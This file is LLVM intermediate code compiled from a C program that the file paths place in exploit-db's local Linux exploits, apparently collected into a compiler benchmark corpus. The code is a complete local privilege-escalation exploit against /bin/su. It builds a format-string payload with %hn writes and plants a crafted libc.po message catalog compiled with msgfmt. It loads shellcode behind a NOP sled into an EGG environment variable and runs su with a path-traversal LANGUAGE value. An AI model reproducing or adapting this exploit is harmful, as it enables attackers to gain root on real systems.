; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_20185.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_20185.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@DEFAULT_RETLOC = common dso_local global i64 0, align 8
@DEFAULT_OFFSET = common dso_local global i32 0, align 4
@DEFAULT_ALIGNMENT = common dso_local global i32 0, align 4
@DEFAULT_BUFFER_SIZE = common dso_local global i32 0, align 4
@DEFAULT_EGG_SIZE = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [3 x i8] c"%x\00", align 1
@.str.1 = private unnamed_addr constant [66 x i8] c"Usages: %s <RETloc> <offset> <num> <align> <buffsize> <eggsize> \0A\00", align 1
@.str.2 = private unnamed_addr constant [24 x i8] c"Can't allocate memory.\0A\00", align 1
@.str.3 = private unnamed_addr constant [34 x i8] c"Using RET location address: 0x%x\0A\00", align 1
@.str.4 = private unnamed_addr constant [31 x i8] c"Using Shellcode address: 0x%x\0A\00", align 1
@.str.5 = private unnamed_addr constant [5 x i8] c"%.8x\00", align 1
@.str.6 = private unnamed_addr constant [19 x i8] c"%%%uc%%hn%%%uc%%hn\00", align 1
@PATH = common dso_local global i32 0, align 4
@.str.7 = private unnamed_addr constant [8 x i8] c"libc.po\00", align 1
@.str.8 = private unnamed_addr constant [3 x i8] c"w+\00", align 1
@.str.9 = private unnamed_addr constant [38 x i8] c"msgid \22%%s: invalid option -- %%c\\n\22\0A\00", align 1
@.str.10 = private unnamed_addr constant [14 x i8] c"msgstr \22%s\\n\22\00", align 1
@.str.11 = private unnamed_addr constant [35 x i8] c"/usr/bin/msgfmt libc.po -o libc.mo\00", align 1
@shellcode = common dso_local global i32* null, align 8
@NOP = common dso_local global i32 0, align 4
@.str.12 = private unnamed_addr constant [5 x i8] c"EGG=\00", align 1
@.str.13 = private unnamed_addr constant [37 x i8] c"LANGUAGE=sk_SK/../../../../../../tmp\00", align 1
@.str.14 = private unnamed_addr constant [8 x i8] c"/bin/su\00", align 1
@.str.15 = private unnamed_addr constant [3 x i8] c"su\00", align 1
@.str.16 = private unnamed_addr constant [3 x i8] c"-u\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  %9 = alloca i8*, align 8
  %10 = alloca [3 x i8*], align 16
  %11 = alloca i64, align 8
  %12 = alloca i64, align 8
  %13 = alloca i64, align 8
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca i32*, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %23 = load i64, i64* @DEFAULT_RETLOC, align 8
  store i64 %23, i64* %12, align 8
  %24 = load i32, i32* @DEFAULT_OFFSET, align 4
  store i32 %24, i32* %14, align 4
  %25 = load i32, i32* @DEFAULT_ALIGNMENT, align 4
  store i32 %25, i32* %15, align 4
  %26 = load i32, i32* @DEFAULT_BUFFER_SIZE, align 4
  store i32 %26, i32* %16, align 4
  %27 = load i32, i32* @DEFAULT_EGG_SIZE, align 4
  store i32 %27, i32* %17, align 4
  store i32 113, i32* %21, align 4
  %28 = load i32, i32* %4, align 4
  %29 = icmp sgt i32 %28, 1
  br i1 %29, label %30, label %35

30:                                               ; preds = %2
  %31 = load i8**, i8*** %5, align 8
  %32 = getelementptr inbounds i8*, i8** %31, i64 1
  %33 = load i8*, i8** %32, align 8
  %34 = call i32 @sscanf(i8* %33, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str, i64 0, i64 0), i64* %12)
  br label %35

35:                                               ; preds = %30, %2
  %36 = load i32, i32* %4, align 4
  %37 = icmp sgt i32 %36, 2
  br i1 %37, label %38, label %43

38:                                               ; preds = %35
  %39 = load i8**, i8*** %5, align 8
  %40 = getelementptr inbounds i8*, i8** %39, i64 2
  %41 = load i8*, i8** %40, align 8
  %42 = call i32 @atoi(i8* %41)
  store i32 %42, i32* %14, align 4
  br label %43

43:                                               ; preds = %38, %35
  %44 = load i32, i32* %4, align 4
  %45 = icmp sgt i32 %44, 3
  br i1 %45, label %46, label %51

46:                                               ; preds = %43
  %47 = load i8**, i8*** %5, align 8
  %48 = getelementptr inbounds i8*, i8** %47, i64 3
  %49 = load i8*, i8** %48, align 8
  %50 = call i32 @atoi(i8* %49)
  store i32 %50, i32* %21, align 4
  br label %51

51:                                               ; preds = %46, %43
  %52 = load i32, i32* %4, align 4
  %53 = icmp sgt i32 %52, 4
  br i1 %53, label %54, label %59

54:                                               ; preds = %51
  %55 = load i8**, i8*** %5, align 8
  %56 = getelementptr inbounds i8*, i8** %55, i64 4
  %57 = load i8*, i8** %56, align 8
  %58 = call i32 @atoi(i8* %57)
  store i32 %58, i32* %15, align 4
  br label %59

59:                                               ; preds = %54, %51
  %60 = load i32, i32* %4, align 4
  %61 = icmp sgt i32 %60, 5
  br i1 %61, label %62, label %67

62:                                               ; preds = %59
  %63 = load i8**, i8*** %5, align 8
  %64 = getelementptr inbounds i8*, i8** %63, i64 5
  %65 = load i8*, i8** %64, align 8
  %66 = call i32 @atoi(i8* %65)
  store i32 %66, i32* %16, align 4
  br label %67

67:                                               ; preds = %62, %59
  %68 = load i32, i32* %4, align 4
  %69 = icmp sgt i32 %68, 6
  br i1 %69, label %70, label %75

70:                                               ; preds = %67
  %71 = load i8**, i8*** %5, align 8
  %72 = getelementptr inbounds i8*, i8** %71, i64 6
  %73 = load i8*, i8** %72, align 8
  %74 = call i32 @atoi(i8* %73)
  store i32 %74, i32* %17, align 4
  br label %75

75:                                               ; preds = %70, %67
  %76 = load i8**, i8*** %5, align 8
  %77 = getelementptr inbounds i8*, i8** %76, i64 0
  %78 = load i8*, i8** %77, align 8
  %79 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([66 x i8], [66 x i8]* @.str.1, i64 0, i64 0), i8* %78)
  %80 = load i32, i32* %17, align 4
  %81 = call i8* @malloc(i32 %80)
  store i8* %81, i8** %6, align 8
  %82 = icmp ne i8* %81, null
  br i1 %82, label %86, label %83

83:                                               ; preds = %75
  %84 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.2, i64 0, i64 0))
  %85 = call i32 @exit(i32 0) #3
  unreachable

86:                                               ; preds = %75
  %87 = load i32, i32* %16, align 4
  %88 = call i8* @malloc(i32 %87)
  store i8* %88, i8** %7, align 8
  %89 = icmp ne i8* %88, null
  br i1 %89, label %93, label %90

90:                                               ; preds = %86
  %91 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.2, i64 0, i64 0))
  %92 = call i32 @exit(i32 0) #3
  unreachable

93:                                               ; preds = %86
  %94 = load i32, i32* %17, align 4
  %95 = call i8* @malloc(i32 %94)
  store i8* %95, i8** %9, align 8
  %96 = icmp ne i8* %95, null
  br i1 %96, label %100, label %97

97:                                               ; preds = %93
  %98 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.2, i64 0, i64 0))
  %99 = call i32 @exit(i32 0) #3
  unreachable

100:                                              ; preds = %93
  %101 = load i64, i64* %12, align 8
  %102 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.3, i64 0, i64 0), i64 %101)
  %103 = call i32 (...) @get_esp()
  %104 = load i32, i32* %14, align 4
  %105 = add nsw i32 %103, %104
  %106 = sext i32 %105 to i64
  store i64 %106, i64* %11, align 8
  %107 = load i64, i64* %11, align 8
  %108 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.4, i64 0, i64 0), i64 %107)
  %109 = load i64, i64* %11, align 8
  %110 = ashr i64 %109, 16
  %111 = and i64 %110, 65535
  %112 = trunc i64 %111 to i32
  store i32 %112, i32* %19, align 4
  %113 = load i64, i64* %11, align 8
  %114 = ashr i64 %113, 0
  %115 = and i64 %114, 65535
  %116 = trunc i64 %115 to i32
  store i32 %116, i32* %20, align 4
  %117 = load i8*, i8** %6, align 8
  store i8* %117, i8** %8, align 8
  store i32 0, i32* %18, align 4
  br label %118

118:                                              ; preds = %149, %100
  %119 = load i32, i32* %18, align 4
  %120 = icmp slt i32 %119, 2
  br i1 %120, label %121, label %154

121:                                              ; preds = %118
  %122 = load i8*, i8** %8, align 8
  %123 = call i32 @memset(i8* %122, i8 signext 65, i32 4)
  %124 = load i8*, i8** %8, align 8
  %125 = getelementptr inbounds i8, i8* %124, i64 4
  store i8* %125, i8** %8, align 8
  %126 = load i64, i64* %12, align 8
  %127 = and i64 %126, 255
  %128 = trunc i64 %127 to i8
  %129 = load i8*, i8** %8, align 8
  %130 = getelementptr inbounds i8, i8* %129, i32 1
  store i8* %130, i8** %8, align 8
  store i8 %128, i8* %129, align 1
  %131 = load i64, i64* %12, align 8
  %132 = ashr i64 %131, 8
  %133 = and i64 %132, 255
  %134 = trunc i64 %133 to i8
  %135 = load i8*, i8** %8, align 8
  %136 = getelementptr inbounds i8, i8* %135, i32 1
  store i8* %136, i8** %8, align 8
  store i8 %134, i8* %135, align 1
  %137 = load i64, i64* %12, align 8
  %138 = ashr i64 %137, 16
  %139 = and i64 %138, 255
  %140 = trunc i64 %139 to i8
  %141 = load i8*, i8** %8, align 8
  %142 = getelementptr inbounds i8, i8* %141, i32 1
  store i8* %142, i8** %8, align 8
  store i8 %140, i8* %141, align 1
  %143 = load i64, i64* %12, align 8
  %144 = ashr i64 %143, 24
  %145 = and i64 %144, 255
  %146 = trunc i64 %145 to i8
  %147 = load i8*, i8** %8, align 8
  %148 = getelementptr inbounds i8, i8* %147, i32 1
  store i8* %148, i8** %8, align 8
  store i8 %146, i8* %147, align 1
  br label %149

149:                                              ; preds = %121
  %150 = load i32, i32* %18, align 4
  %151 = add nsw i32 %150, 1
  store i32 %151, i32* %18, align 4
  %152 = load i64, i64* %12, align 8
  %153 = add nsw i64 %152, 2
  store i64 %153, i64* %12, align 8
  br label %118

154:                                              ; preds = %118
  %155 = load i8*, i8** %8, align 8
  %156 = load i32, i32* %15, align 4
  %157 = call i32 @memset(i8* %155, i8 signext 65, i32 %156)
  %158 = load i8*, i8** %7, align 8
  store i8* %158, i8** %8, align 8
  store i32 0, i32* %18, align 4
  br label %159

159:                                              ; preds = %168, %154
  %160 = load i32, i32* %18, align 4
  %161 = load i32, i32* %21, align 4
  %162 = icmp slt i32 %160, %161
  br i1 %162, label %163, label %171

163:                                              ; preds = %159
  %164 = load i8*, i8** %8, align 8
  %165 = call i32 @memcpy(i8* %164, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.5, i64 0, i64 0), i32 4)
  %166 = load i8*, i8** %8, align 8
  %167 = getelementptr inbounds i8, i8* %166, i64 4
  store i8* %167, i8** %8, align 8
  br label %168

168:                                              ; preds = %163
  %169 = load i32, i32* %18, align 4
  %170 = add nsw i32 %169, 1
  store i32 %170, i32* %18, align 4
  br label %159

171:                                              ; preds = %159
  %172 = load i8*, i8** %8, align 8
  %173 = load i32, i32* %20, align 4
  %174 = load i32, i32* %21, align 4
  %175 = mul nsw i32 %174, 8
  %176 = sub nsw i32 %173, %175
  %177 = load i32, i32* %19, align 4
  %178 = add nsw i32 65536, %177
  %179 = load i32, i32* %20, align 4
  %180 = sub nsw i32 %178, %179
  %181 = call i32 @sprintf(i8* %172, i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.6, i64 0, i64 0), i32 %176, i32 %180)
  %182 = load i32, i32* @PATH, align 4
  %183 = call i32 @mkdir(i32 %182, i32 493)
  %184 = load i32, i32* @PATH, align 4
  %185 = call i32 @chdir(i32 %184)
  %186 = call i32* @fopen(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.7, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.8, i64 0, i64 0))
  store i32* %186, i32** %22, align 8
  %187 = load i32*, i32** %22, align 8
  %188 = call i32 (i32*, i8*, ...) @fprintf(i32* %187, i8* getelementptr inbounds ([38 x i8], [38 x i8]* @.str.9, i64 0, i64 0))
  %189 = load i32*, i32** %22, align 8
  %190 = load i8*, i8** %7, align 8
  %191 = call i32 (i32*, i8*, ...) @fprintf(i32* %189, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.10, i64 0, i64 0), i8* %190)
  %192 = load i32*, i32** %22, align 8
  %193 = call i32 @fclose(i32* %192)
  %194 = call i32 @system(i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.11, i64 0, i64 0))
  %195 = load i8*, i8** %9, align 8
  store i8* %195, i8** %8, align 8
  store i32 0, i32* %18, align 4
  br label %196

196:                                              ; preds = %209, %171
  %197 = load i32, i32* %18, align 4
  %198 = load i32, i32* %17, align 4
  %199 = load i32*, i32** @shellcode, align 8
  %200 = call i32 @strlen(i32* %199)
  %201 = sub nsw i32 %198, %200
  %202 = sub nsw i32 %201, 1
  %203 = icmp slt i32 %197, %202
  br i1 %203, label %204, label %212

204:                                              ; preds = %196
  %205 = load i32, i32* @NOP, align 4
  %206 = trunc i32 %205 to i8
  %207 = load i8*, i8** %8, align 8
  %208 = getelementptr inbounds i8, i8* %207, i32 1
  store i8* %208, i8** %8, align 8
  store i8 %206, i8* %207, align 1
  br label %209

209:                                              ; preds = %204
  %210 = load i32, i32* %18, align 4
  %211 = add nsw i32 %210, 1
  store i32 %211, i32* %18, align 4
  br label %196

212:                                              ; preds = %196
  store i32 0, i32* %18, align 4
  br label %213

213:                                              ; preds = %227, %212
  %214 = load i32, i32* %18, align 4
  %215 = load i32*, i32** @shellcode, align 8
  %216 = call i32 @strlen(i32* %215)
  %217 = icmp slt i32 %214, %216
  br i1 %217, label %218, label %230

218:                                              ; preds = %213
  %219 = load i32*, i32** @shellcode, align 8
  %220 = load i32, i32* %18, align 4
  %221 = sext i32 %220 to i64
  %222 = getelementptr inbounds i32, i32* %219, i64 %221
  %223 = load i32, i32* %222, align 4
  %224 = trunc i32 %223 to i8
  %225 = load i8*, i8** %8, align 8
  %226 = getelementptr inbounds i8, i8* %225, i32 1
  store i8* %226, i8** %8, align 8
  store i8 %224, i8* %225, align 1
  br label %227

227:                                              ; preds = %218
  %228 = load i32, i32* %18, align 4
  %229 = add nsw i32 %228, 1
  store i32 %229, i32* %18, align 4
  br label %213

230:                                              ; preds = %213
  %231 = load i8*, i8** %9, align 8
  %232 = load i32, i32* %17, align 4
  %233 = sub nsw i32 %232, 1
  %234 = sext i32 %233 to i64
  %235 = getelementptr inbounds i8, i8* %231, i64 %234
  store i8 0, i8* %235, align 1
  %236 = load i8*, i8** %9, align 8
  %237 = call i32 @memcpy(i8* %236, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.12, i64 0, i64 0), i32 4)
  %238 = load i8*, i8** %9, align 8
  %239 = getelementptr inbounds [3 x i8*], [3 x i8*]* %10, i64 0, i64 0
  store i8* %238, i8** %239, align 16
  %240 = getelementptr inbounds [3 x i8*], [3 x i8*]* %10, i64 0, i64 1
  store i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.13, i64 0, i64 0), i8** %240, align 8
  %241 = getelementptr inbounds [3 x i8*], [3 x i8*]* %10, i64 0, i64 2
  store i8* null, i8** %241, align 16
  %242 = load i8*, i8** %6, align 8
  %243 = getelementptr inbounds [3 x i8*], [3 x i8*]* %10, i64 0, i64 0
  %244 = call i32 @execle(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.14, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.15, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.16, i64 0, i64 0), i8* %242, i32* null, i8** %243)
  %245 = load i32, i32* %3, align 4
  ret i32 %245
}

declare dso_local i32 @sscanf(i8*, i8*, i64*) #1

declare dso_local i32 @atoi(i8*) #1

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i8* @malloc(i32) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @get_esp(...) #1

declare dso_local i32 @memset(i8*, i8 signext, i32) #1

declare dso_local i32 @memcpy(i8*, i8*, i32) #1

declare dso_local i32 @sprintf(i8*, i8*, i32, i32) #1

declare dso_local i32 @mkdir(i32, i32) #1

declare dso_local i32 @chdir(i32) #1

declare dso_local i32* @fopen(i8*, i8*) #1

declare dso_local i32 @fprintf(i32*, i8*, ...) #1

declare dso_local i32 @fclose(i32*) #1

declare dso_local i32 @system(i8*) #1

declare dso_local i32 @strlen(i32*) #1

declare dso_local i32 @execle(i8*, i8*, i8*, i8*, i32*, i8**) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
